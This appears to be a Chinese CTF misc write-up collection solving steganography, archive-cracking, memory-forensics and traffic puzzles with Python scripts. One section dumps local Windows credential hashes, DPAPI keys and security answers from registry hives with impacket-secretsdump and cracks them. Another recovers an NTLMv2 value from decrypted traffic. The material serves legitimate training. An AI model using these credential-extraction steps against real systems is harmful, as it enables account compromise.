将数字分割到32-126范围上转ASCII，然后再大小写 m 转成 - ，大小写 s 转成 . ，解摩斯得到压缩包解压密码：`GO0DLC$K`

![](imgs/image-20250823103211907.png)

解压rar后得到一个多层base64套娃，循环解base64即可得到flag：`DASCTF{a3dcb4d229de6fde0db5686dee47145d}`

![](imgs/image-20250823103458023.png)

## 题目名称 new

解压附件压缩包，可以得到下面这张PNG图片

![](imgs/image-20250823163151360.png)

先用zsteg梭一把，发现没有啥特别的东西

![](imgs/image-20250823163252179.png)

然后拿stegsolve去看，发现 R0 G0 B0 都有明显LSB隐写的痕迹

![](imgs/image-20250823163407581.png)

![](imgs/image-20250823163425323.png)

![](imgs/image-20250823163439246.png)

因此尝试提取图中的LSB数据，在位顺序选择LSB优先时可以发现JPG图片的文件头

![](imgs/image-20250823164657070.png)

提取出来并删去前面多余数据后，即可得到最后的flag：`flag{054e676ef5f0de537ebe6604fadaf0fc}`

![](imgs/image-20250823164322947.png)

&gt; 这道题为啥用zsteg没法识别出来jpg呢？因为题目在隐写的jpg图片前添加了一些干扰数据

## 题目名称 安全杂项10 (交通运输行业大赛)

解压附件压缩包可以得到下面这张PNG

![](imgs/image-20250824104656438.png)

仔细观察可以发现图片下面这几行的像素是有问题的

然后我们拿zsteg扫的时候，发现也报错了，说明图片肯定是经过篡改的

![](imgs/image-20250824104751856.png)

因此我们拿pngcheck来检查一下图片，发现图片确实是被篡改了

![](imgs/image-20250824104822719.png)

到这里，就猜测这道题考察的可能是PNG的IDAT隐写

所以我们拿010把PNG的最后一个IDAT块提取出来，并用Cyberchef解压一下

![](imgs/image-20250824105034862.png)

![](imgs/image-20250824105053395.png)

解压后即可得到密文和密钥，并且密钥是8字节的

经过尝试发现RC4解密即可得到最后的flag：`flag{edb99a94-f84d-e175-8a7d-e7f658789447}`

![](imgs/image-20250824105235178.png)


## 题目名称 file2

解压附件压缩包，得到一个camera.png还有一个flag.zip

flag.zip中的文件如下

![](imgs/image-20250824181312451.png)

一眼明文攻击，010打开发现标志位是0x14，因此猜测是Bandizip或者WinRAR压缩的

![](imgs/image-20250824181522089.png)

经过尝试，发现Bandizip不行，用WinRAR压缩的能正常明文攻击

![](imgs/image-20250824181627646.png)

用修改后的密码123解压即可得到flag：`flag{33fe6D4cE7MLd}`

![](imgs/image-20250824181716085.png)

## 题目名称 二维码画图

附件给了下面这张jpg

![](imgs/image-20250824181820652.png)

010打开发现末尾藏了一个文件头被篡改的rar压缩包

![](imgs/image-20250824181904776.png)

提取出来并把文件头修复 `Rar!(52617221)` ，解压可以得到很多个0和1的嵌套目录

![](imgs/image-20250824182037937.png)

![](imgs/image-20250824182119059.png)

目录最底层是一个 _ 文件，其中是二进制数据，根据题目名称，猜测就是二进制转二维码

写个脚本提取并转换一下

```python
import os
import sys
from PIL import Image

def dfs_traverse(current_path, contents):
    &#34;&#34;&#34;使用DFS遍历目录并提取_文件内容&#34;&#34;&#34;
    # 检查当前路径是否有_文件
    underscore_file = os.path.join(current_path, &#34;_&#34;)
    if os.path.exists(underscore_file):
        try:
            with open(underscore_file, &#39;r&#39;) as f:
                contents.append(f.read().strip())
        except Exception as e:
            contents.append(f&#34;Error reading {underscore_file}: {str(e)}&#34;)
    
    # 按顺序检查0和1子目录（先0后1）
    for subdir in [&#39;0&#39;, &#39;1&#39;]:
        subdir_path = os.path.join(current_path, subdir)
        if os.path.exists(subdir_path) and os.path.isdir(subdir_path):
            dfs_traverse(subdir_path, contents)

def extract_file_contents(root_dir):
    &#34;&#34;&#34;提取目录中所有_文件的内容&#34;&#34;&#34;
    contents = []
    dfs_traverse(root_dir, contents)
    return &#39;&#39;.join(contents)

def draw_qrcode(data):
    img = Image.new(&#39;RGB&#39;, (59, 59))
    w,h = 59,59
    for i in range(len(data)):
        x = i % w
        y = i // w
        if data[i] == &#39;0&#39;:
            img.putpixel((x, y), (255, 255, 255))
        else:
            img.putpixel((x, y), (0, 0, 0))
    resized_img = img.resize((590, 590), Image.NEAREST)
    # resized_img.show()
    resized_img.save(&#39;qrcode.png&#39;)

def main():
    root_dir = &#39;./&#39;
    contents = extract_file_contents(root_dir)
    print(contents)
    draw_qrcode(contents)

    # Welcome, Key: 2339649336ce442c

if __name__ == &#34;__main__&#34;:
    main()
```

![](imgs/image-20250824182241025.png)

扫码得到：`Welcome, Key: 2339649336ce442c`

![](imgs/image-20250824182330161.png)

回头去看提取出来的rar，发现末尾还有一个加密的zip压缩包

![](imgs/image-20250824182426296.png)

提取出来，然后输入之前得到的密码解压即可得到最后的flag：`flag{b9c8ab267048488298648cc3793fc498}`

## 题目名称 PIC2

题目附件给了一个伪加密的zip压缩包，去除伪加密后得到一张jpg

010打开发现末尾藏了一张jpg，并且中间还有一串字符

![](imgs/image-20250825161100104.png)

把jpg和中间的字符提取出来，发现这张jpg也和之前的一样藏了jpg和一些字符

![](imgs/image-20250825161203451.png)

我们按照规律依此提取

![](imgs/image-20250825161413138.png)

![](imgs/image-20250825161431083.png)

最后将提取出来的字符base32解码即可得到flag：`KEY{b26259f93cbb178944034b7e367c6fa5}`

![](imgs/image-20250825161519274.png)

## 题目名称 flag\^galf

题目附件给了一个Ubuntu flag.lime内存镜像

拿到内存镜像，先用R-studio扫一下，发现没有扫到什么特别的信息

![](imgs/image-20250828100619466.png)

然后我们拿010打开内存镜像，尝试搜索几个常见的关键字，并用肉眼去扫一遍

![](imgs/image-20250828100828915.png)

发现出题人用enc.py去加密了一张图片，并且下面的定时任务也提示了我们用的可能是异或的方法

至此我们大概就知道出题人的意图了，因此我们需要尝试从内存镜像中提取出这几张图片和加密脚本

这个需要我们去制作vol2的Profile，然后去进行内存取证（vol3没办法导出文件）

如何制作vol2的Profile可以参考我的这篇博客：[Misc-Forensics](https://goodlunatic.github.io/posts/761da51/)

做好Profile后，打包为zip放到`volatility/volatility/plugins/overlays/linux`即可

然后运行`python2 volatility/vol.py --info`，发现可以正常加载Profile

![](imgs/image-20250828101336228.png)

我们首先看一下命令行中的历史记录，可以看到出题人加密图片的命令

```bash
python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile=LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_bash &gt; linux_bash.txt
```

![](imgs/image-20250828101607699.png)

然后尝试查找并导出这几张加密图片和脚本

```bash
python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile=LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_find_file -L | grep &#34;enc.py&#34;

python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile=LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_find_file -i 0xffff8de7b8c92b18 -O ./enc.py

python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile=LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_find_file -L | grep &#34;picture.png&#34;

python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile=LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_find_file -i 0xffff8de7b8dab388 -O ./picture.png

python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile=LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_find_file -L | grep &#34;encrypt.png&#34;

python2 ~/CTF/volatility/vol.py -f ubuntu.lime --profile=LinuxUbuntu_4_13_0-36_4_13_0-36_40x64 linux_find_file -i 0xffff8de7b8daf708 -O ./encrypt.png
```

发现enc.py导出来是空的并且内存中找不到ori.png，但是picture.png和encrypt.png可以正常导出

因此结合之前在定时任务中得到的提示，猜测出题人是要我们去分析这个图片异或加密算法了

![](imgs/image-20250828102814331.png)

先尝试写了一个脚本，直接把两张图片的像素异或一下，发现能看到flag的影子，但是不清晰

```python
from PIL import Image

def func1():
    img1 = Image.open(&#34;encrypt.png&#34;)
    img2 = Image.open(&#34;picture.png&#34;)
    w,h = img1.size
    img3 = Image.new(&#34;RGB&#34;, (w,h))
    for y in range(h):
        for x in range(w):
            r1,g1,b1,a1 = img1.getpixel((x,y))
            r2,g2,b2,a2 = img2.getpixel((x,y))
            r = r1 ^ r2
            g = g1 ^ g2
            b = b1 ^ b2
            a = a1 ^ a2
            img3.putpixel((x,y),(r,g,b,a))
                
    img3.show()
    img3.save(&#34;img3.png&#34;)
```

![](imgs/image-20250828103341050.png)

因此，尝试去分析了一下像素的规律，然后发现有部分连续像素点的rgba的异或结果相同

然后尝试缩小了一下异或结果res的范围，发现`res&gt;=255`的时候（其实就是`res==255`的时候）

可以得到清晰的flag图像

```python
def func2():
    img1_pixles = []
    img2_pixles = []
    xor_pixles = []
    img1 = Image.open(&#34;encrypt.png&#34;)
    img2 = Image.open(&#34;picture.png&#34;)
    w,h = img1.size
    img3 = Image.new(&#34;RGB&#34;, (w,h))
    for y in range(h):
        for x in range(w):
            r1,g1,b1,a1 = img1.getpixel((x,y))
            r2,g2,b2,a2 = img2.getpixel((x,y))
            r = r1 ^ r2
            g = g1 ^ g2
            b = b1 ^ b2
            a = a1 ^ a2
            res = r ^ g ^ b ^ a # 发现部分连续像素异或出来的结果相同
            print(res,end=&#39; &#39;)
            img1_pixles.append((bin(r1)[2:].rjust(8,&#39;0&#39;),bin(g1)[2:].rjust(8,&#39;0&#39;),bin(b1)[2:].rjust(8,&#39;0&#39;),bin(a1)[2:].rjust(8,&#39;0&#39;)))
            r2,g2,b2,a2 = img2.getpixel((x,y))
            img2_pixles.append((bin(r2)[2:].rjust(8,&#39;0&#39;),bin(g2)[2:].rjust(8,&#39;0&#39;),bin(b2)[2:].rjust(8,&#39;0&#39;),bin(a2)[2:].rjust(8,&#39;0&#39;)))
            xor_pixles.append((bin(r)[2:].rjust(8,&#39;0&#39;),bin(g)[2:].rjust(8,&#39;0&#39;),bin(b)[2:].rjust(8,&#39;0&#39;),bin(a)[2:].rjust(8,&#39;0&#39;)))
            if res &gt;= 255:
                img3.putpixel((x,y),(0,0,0))
            else:
                img3.putpixel((x,y),(255,255,255))
                
    print(img1_pixles[:10])
    print(img2_pixles[:10])
    print(xor_pixles[:10])
    img3.show()
    img3.save(&#34;flag.png&#34;)
```

![](imgs/image-20250828103832643.png)

当然以上只是我一开始的解题思路，后来回头联想了一下题目的名称 `flag ^ galf`

想到出题人的真实意图应该是img1的rgba异或img2的abgr

因此写了个脚本，复原出了出题人的ori.png，得到本题的flag: `DASCTF{9da98cbf7e99bff7c93ef066935f65ba}`

```python
def func3():
    img1 = Image.open(&#34;encrypt.png&#34;)
    img2 = Image.open(&#34;picture.png&#34;)
    w,h = img1.size
    img3 = Image.new(&#34;RGBA&#34;, (w,h))
    for y in range(h):
        for x in range(w):
            r1,g1,b1,a1 = img1.getpixel((x,y))
            r2,g2,b2,a2 = img2.getpixel((x,y))
            r = r1 ^ a2
            g = g1 ^ b2
            b = b1 ^ g2
            a = a1 ^ r2
            img3.putpixel((x,y),(r,g,b,a))

    img3.show()
    img3.save(&#34;ori.png&#34;)
```

![](imgs/image-20250828104214940.png)

## 题目名称 base_2

附件给了以下这张PNG，010打开发现末尾藏了一个ZIP压缩包

![](imgs/image-20250828115022552.png)

![](imgs/image-20250828115106700.png)

提取出来解压，得到一个xor文件，内容是base64编码的字符串

zsteg扫一下png，得到一串字符，长度刚刚好是32位

![](imgs/image-20250828115217348.png)

使用Cyberchef解码base64然后异或一下上面这个字符串即可得到一堆base32字符串

![](imgs/image-20250828115255687.png)

最后解base32隐写即可得到最后的flag: `DASCTF{e738d5d58f8e231f0523b768558cc959}`

![](imgs/image-20250828115400614.png)

## 题目名称 deep-with-deep

题目附件给了一个 wav 文件，元数据中提示了密码是 deep

![](imgs/image-20250831225722108.png)

结合题目名称和 wav，很容易联想到是 deepsound

输入密钥解密即可得到一张 png 图片

![](imgs/image-20250831225904252.png)

用 stegsolve 打开刚刚得到的 PNG，发现 Alpha Plane 2 有 LSB 隐写的痕迹 

![](imgs/image-20250831230055487.png)

因此我们写个脚本提取一下即可：`flag{225f667d9243201a6b2b35e008ebe3d3}`

```python
from PIL import Image

def func1():
    res = &#34;&#34;
    flag = False
    img = Image.open(&#34;deep.png&#34;)
    w,h = img.size
    for x in range(400,401):
        for y in range(h):
            r,g,b,a = img.getpixel((x,y))
            # if a!=255:
            #     print(a,(x,y))
            #     break
            if (a &gt;&gt; 2) &amp; 1 == 0:
                res &#43;= &#39;0&#39;
            else:
                res &#43;= &#39;1&#39;
    print(res)     
    
if __name__ == &#39;__main__&#39;:
    func1()
```

![](imgs/image-20250831231637620.png)


## 题目名称 python_jail

题目所给附件如下

![](imgs/image-20250831231949303.png)

依次解密零宽和 whitespace 隐写即可得到压缩包解压密码：`a8e15220-7404-4269-812e-6418557b7dc2`

![](imgs/image-20250831232032459.png)

![](imgs/image-20250831232044134.png)

![](imgs/image-20250831232154057.png)

![](imgs/image-20250831232321966.png)

解压后可以得到一张 PNG 图片，并且 PNG 图片 LSB 隐写了一个 python3.9 打包的 pyc 文件

![](imgs/image-20250831232555879.png)

直接导出然后用 pccdc 反编译一下即可

```bash
zsteg -e &#34;b1,rgb,lsb,xy&#34; SECRET1.png &gt; 1.pyc
```

![](imgs/image-20250831233012985.png)

最后解个 base64 即可得到最后的 flag：`flag{b5bcfc87-5ca6-43f1-b384-57d09b886ca9}`

## 题目名称 bus

题目附件给了一个`bus.cap`，Linux下 file 一下发现是 pcap 文件，直接 wireshark 打开

发现主要是 modbus 流量

![](imgs/image-20250831222911936.png)

稍微翻看一下流量包，发现一共就两种操作：读保持寄存器、写单个寄存器

因此我们可以按照顺序去查看 读保持寄存器 时的内容

![](imgs/image-20250831223301033.png)

![](imgs/image-20250831223331278.png)

主要关注上面两个包，解码第一个可以得到密钥：`flag{nononononononononono_this_is_key}`

![](imgs/image-20250831223909400.png)

然后解第二个流量包，发现解出来的密文是 40 字节，但是上面密钥是 38 字节

![](imgs/image-20250831223832223.png)

仔细观察密钥，发现出题人填充了很多个 nonono，猜测可能是故意调整到这个长度

然后注意到密文前后都有个 0x2d，删除后刚刚好和密钥的长度对上，都是 38 字节

最后异或一下，再 ROT47 解码即可得到最后的 flag：`flag{25b3318b9651cc7f3af666343614142e}`

![](imgs/image-20250831224226272.png)

## 题目名称 att

题目附件给了一个压缩包，打开查看，很明显提示了明文攻击

![](imgs/image-20250911201639523.png)

![](imgs/image-20250911201453298.png)

解压后得到一个加密的压缩包，尝试弱密码爆破得到解压密码：`123456`

![](imgs/image-20250911201518426.png)

解压后得到 flag.txt，内容如下：

&gt; INalVNrhVMK3WMa7XMqB2F2FuSbo&#43;

XXencode 解码即可得到最后的 flag : `flag{aaabbbcccDDDzz}`

![](imgs/image-20250911201833891.png)

## 题目名称 你知道我的密码吗？

题目附件给了以下三个文件，猜测需要我们从这三个文件中恢复密码

![](imgs/image-20250911222018399.png)

结合文件名搜索到如下这篇文章：

https://www.bordergate.co.uk/extracting-windows-credentials-using-native-tools/

直接在 Kali-Linux 里用 impacket-secretsdump 导出 hash 即可

![](imgs/image-20250911222509582.png)

```bash
$ impacket-secretsdump -sam &#39;./sam&#39; -system &#39;./sys&#39; -security &#39;./security&#39; LOCAL
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0xb503ddc9ee9d7745dea270d29a317d21
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:124c1eb810a265ea0eb2b12fe814c070:::
Admin:1001:aad3b435b51404eeaad3b435b51404ee:ad70819c5bc807280974d80f45982011:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0d1b5bdfc8d33c4fab65c842bddae69beca945b0
dpapi_userkey:0xb55e67d132394e16d9678c344feb238628eef222
[*] L$_SQSA_S-1-5-21-2002660762-2776537960-2635005223-1001 
Security Questions for user S-1-5-21-2002660762-2776537960-2635005223-1001: 
 - Version : 1
 | Question: 你出生城市的名称是什么?
 | |--&gt; Answer: ht
 | Question: 你孩童时期的昵称是什么?
 | |--&gt; Answer: ff
 | Question: 你的母校名称是什么?
 | |--&gt; Answer: cz
[*] NL$KM 
 0000   DF 8C 5F 63 8E BD 17 89  B0 A1 0E A1 0A 4D 53 50   .._c.........MSP
 0010   03 92 03 AD 36 FC E2 89  67 93 63 27 B1 C4 4F E2   ....6...g.c&#39;..O.
 0020   79 82 BD F3 98 91 78 B1  C0 22 73 A9 DF B9 7C B4   y.....x..&#34;s...|.
 0030   56 F9 9D 84 82 FA 8A 0C  9E 9E 31 19 6C 85 40 9C   V.........1.l.@.
NL$KM:df8c5f638ebd1789b0a10ea10a4d5350039203ad36fce28967936327b1c44fe27982bdf3989178b1c02273a9dfb97cb456f99d8482fa8a0c9e9e31196c85409c
[*] RasDialParams!S-1-5-21-2002660762-2776537960-2635005223-1001#0 
 0000   32 00 33 00 32 00 35 00  33 00 35 00 37 00 31 00   2.3.2.5.3.5.7.1.
 0010   38 00 00 00 31 00 36 00  30 00 38 00 00 00 36 00   8...1.6.0.8...6.
 0020   31 00 00 00 00 00 2A 00  00 00 73 00 32 00 30 00   1.....*...s.2.0.
 0030   31 00 34 00 31 00 34 00  30 00 33 00 31 00 33 00   1.4.1.4.0.3.1.3.
 0040   30 00 00 00 00 00 00 00  31 00 00 00 00 00         0.......1.....
RasDialParams!S-1-5-21-2002660762-2776537960-2635005223-1001#0:32003300320035003300350037003100380000003100360030003800000036003100000000002a000000730032003000310034003100340030003300310033003000000000000000310000000000
[*] Cleaning up...

```

&gt; 这里网上也有直接单独用 secretsdump.py 提取的，但是我这里没成功

提取出来后用 hashcat 爆破或者在线网站查询即可

![](imgs/image-20250911222711072.png)

这个 `31d6cfe0d16ae931b73c59d7e0c089c0` 爆破出来是空密码

![](imgs/image-20250911222733560.png)

![](imgs/image-20250911222904183.png)

因为缺少题面信息，不知道 flag 要求的具体格式，但是我们已经得到了 Admin 用户的密码：`123qwe`

## 题目名称 Strangesystem（2024数据安全产业人才积分争夺赛）

题目附件给了一个pcap流量包，翻看一下发现主要是HTTP和QUIC的流量，并且追踪HTTP流发现如下内容

![image-20250913094934461](imgs/image-20250913094934461.png)

传了一张PNG，并且末尾藏了一个ZIP压缩包以及TLS的sslkey.log文件

其中ZIP压缩包是加密的，猜测是需要我们从加密的TLS流量中获得压缩包的解压密码

因此我们尝试提取并把这三个文件分离开来，然后把sslkey.log导入

![image-20250913095236590](imgs/image-20250913095236590.png)

这时候我们就能看到解密后的QUIC流量的内容了，可以得到如下关键信息

```bash
username=admin&amp;password=QUICAUTH-CCC123!@#

admin::SecretServer:d158262017948de9:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000
```

发现第二部分的内容是一个 NTLMv2 Hash

一个正常的 NTLMv2 Hash 格式应该是：`username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response`

但是很明显这里的 `NTproofstring`有问题，因为都是xxx，猜测需要我们去恢复这个

参考网上NTLM认证协议中的密钥派生过程，写个脚本生成一下

```python
import hashlib
import hmac

user_name = &#34;admin&#34;
password = &#34;QUICAUTH-CCC123!@#&#34;
domain_name = &#34;SecretServer&#34;

# 使用MD4消息摘要算法得到16字节的 NTLM_HASH
ntlm_hash = hashlib.new(&#34;md4&#34;, password.encode(&#34;utf-16-le&#34;)).digest().hex()
print(f&#34;NTLM Hash: {ntlm_hash}&#34;)

user_domain_name = user_name.upper().encode(&#34;utf-16-le&#34;)&#43;domain_name.upper().encode(&#34;utf-16-le&#34;)
print(f&#34;User Domain Data: {user_domain_name}&#34;)

# 使用 NTLM_HASH 作为密钥对用户名域名进行MD5加密
firstHMAC = hmac.new(bytes.fromhex(ntlm_hash), user_domain_name, hashlib.md5).hexdigest()
print(f&#34;First HMAC Result: {firstHMAC}&#34;)

ntlm_authentication_data = &#34;d158262017948de9010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000&#34;

NTproofstring = hmac.new(bytes.fromhex(firstHMAC), bytes.fromhex(ntlm_authentication_data), hashlib.md5).hexdigest()
print(NTproofstring)

# NTLM Hash: 61a26d3fee855453bc125700bc8cf6f2
# User Domain Data: b&#39;A\x00D\x00M\x00I\x00N\x00S\x00E\x00C\x00R\x00E\x00T\x00S\x00E\x00R\x00V\x00E\x00R\x00&#39;
# First HMAC Result: 7d3ce509093fb2b7bcbbe7939fa8ee74
# efa243f442b9d683eb1b00a2b1a0c9fc
```

把得到的 `NTproofstring` 作为压缩包解压密码解压即可得到最后的flag：`flag{8af4d019-98ae-4b4f-a4e9-97076d205fd2}`

## 题目名称 xxxxxx（2022 DASCTF X SU 三月春季挑战赛）

题目附件给了一个 xxxxxx.bmp 和一个 xxxxxxEncrypt.py

xxxxxxEncrypt.py 内容如下，发现是经过混淆的 DCT 变换

```python
xxxxxxx = cv2.imread(&#39;xxxxxxx.bmp&#39;, 0)
xxxxxxxx = cv2.imread(&#39;xxxxxxxx.bmp&#39;, 0)
xxxxxxxxx, xxxxxxxxxx = xxxxxxx.shape
xxxxxxxxxxx = int(xxxxxxxxx/8)
xxxxxxxxxxxx = int(xxxxxxxxxx/8)
fingernum = xxxxxxxx.shape[0] * xxxxxxxx.shape[1]
r = math.ceil(fingernum/(xxxxxxxxxxx*xxxxxxxxxxxx))
xxxxxxx = np.float32(xxxxxxx)

xxxxxxxxxxxxx = xxxxxxx

for i in range(xxxxxxxxxxx):
	for j in range(xxxxxxxxxxxx):
		xxxxxxxxxxxxxxx = cv2.dct(xxxxxxx[8*i:8*i&#43;8, 8*j:8*j&#43;8])
		for t in range(r):
			rx, ry = 4, 4
			r1 = xxxxxxxxxxxxxxx[rx, ry]
			r2 = xxxxxxxxxxxxxxx[7-rx, 7-ry]
			detat=abs(r1-r2)
			xxxxxxxxxxxxxx = float(detat &#43; 100)
			if xxxxxxxx[i][j] == 0:
				if r1 &lt;= r2:
					xxxxxxxxxxxxxxx[rx, ry] &#43;= xxxxxxxxxxxxxx
			if xxxxxxxx[i][j] == 255:
				if r1 &gt;= r2:
					xxxxxxxxxxxxxxx[7-rx, 7-ry] &#43;= xxxxxxxxxxxxxx
		xxxxxxxxxxxxx[8*i:8*i&#43;8, 8*j:8*j&#43;8] = cv2.idct(xxxxxxxxxxxxxxx)
cv2.imwrite(&#34;xxxxxx.bmp&#34;, xxxxxxxxxxxxx)
```

因此我们需要先去混淆

```python
import cv2,math
import numpy as np

img = cv2.imread(&#39;xxxxxxx.bmp&#39;, 0)
flag = cv2.imread(&#39;xxxxxxxx.bmp&#39;, 0)
height, width = img.shape
block_y = int(height/8)
block_x = int(width/8)
fingernum = flag.shape[0] * flag.shape[1]
r = math.ceil(fingernum/(block_y*block_x)) # 返回大于等于参数fingernum/(x*y)的最小整数
img = np.float32(img) # 转换为float类型，便于后续DCT变换

new_img = img

for h in range(block_y):
    for w in range(block_x):
        data_dct = cv2.dct(img[8*h:8*h&#43;8, 8*w:8*w&#43;8])
        for t in range(r):
            rx, ry = 4, 4
            r1 = data_dct[rx, ry] # 可以知道8格一块然后修改dct的3和4处数据
            r2 = data_dct[7-rx, 7-ry]
            detat=abs(r1-r2) # 绝对值
            tmp = float(detat &#43; 100)
            if flag[h][w] == 0:
                if r1 &lt;= r2: # 比较两边大小
                    data_dct[rx, ry] &#43;= tmp
            if flag[h][w] == 255:
                if r1 &gt;= r2:
                    data_dct[7-rx, 7-ry] &#43;= tmp
        new_img[8*h:8*h&#43;8, 8*w:8*w&#43;8] = cv2.idct(data_dct)
cv2.imwrite(&#34;xxxxxx.bmp&#34;, new_img)
```

写个脚本提取数据

```python
import cv2,math
import numpy as np
from Crypto.Util import number

img = cv2.imread(&#39;xxxxxx.bmp&#39;, 0)
height, width = img.shape
block_y = int(height/8)
block_x = int(width/8)
img = np.float32(img)

res = &#39;&#39;
for h in range(block_y):
    for w in range(block_x):
        data_dct = cv2.dct(img[8*h:8*h&#43;8, 8*w:8*w&#43;8])
        rx, ry = 4, 4
        r1 = data_dct[rx, ry]
        r2 = data_dct[7-rx, 7-ry]
        if r1 &gt; r2:
            res &#43;= &#39;0&#39;
        else:
            res &#43;= &#39;1&#39;
print(res)
```

提取出来的数据发现是一堆连续的0和1，尝试统计一下每组0和1的个数，发现刚刚好在ASCII码的范围内

```
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111111111111111111111111111111111000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000011111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111110000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
```

因此直接写个脚本统计并转ASCII即可得到最后的flag: `e25bd92141be945cfcdd1c65bb1b9375`

```python
idx_list = []
now_num = &#39;0&#39;
for i in range(len(res)):
    if res[i] != now_num:
        # print(i)
        idx_list.append(i)
        now_num = res[i]

flag = chr(101)
for i in range(1,len(idx_list)):
    flag &#43;= chr(idx_list[i]-idx_list[i-1])

print(flag) # e25bd92141be945cfcdd1c65bb1b9375
```

## 题目名称 未知

题目附件给了一张 `pk.gif` 和一张 `浏览器？.png`，尝试给 GIF 分帧，发现其中一帧有可疑的字符串：`hello_Hier_qw5612`

![](imgs/image-20250916200923042.png)

然后在另一张PNG末尾可以提取出一个加密的rar压缩包，解压密码就是上面得到的那串字符串

解压后可以得到一个完整的Chrome浏览器用户数据目录

主要关注这两个sqlite文件：`Google\Chrome\User Data\Default\History.db\Login Data`、`Google\Chrome\User Data\Default\History.db\History`

vscode中如果装了`SQlite Viewer`插件，可以直接把这俩文件后缀改成`.db`查看

![](imgs/image-20250916201359259.png)

![](imgs/image-20250916201419076.png)

发现用户访问了希尔加密的网站，并且logins表中的两个用户名有点可疑

&gt; .vyouhlvgbaryvxgjqknzbi,vgrqqrwbdxhximtq
&gt; 
&gt; bposqrclvjmzanfx

上图中的那个希尔加密的网站好像已经寄了，于是我直接用新版随波逐流里的希尔加密了

![](imgs/image-20250916201617439.png)

![](imgs/image-20250916201628176.png)

一开始尝试解密发现出不来，最后发现要用加密才能得到最后的flag: `DASCTF{principle_of_basic_matrix_theory}`

## 题目名称 特殊流量

题目附件给了一个流量包，翻看一下发现以下几个可疑信息

首先是给了一个hint：crc32

![](imgs/image-20250917205924080.png)

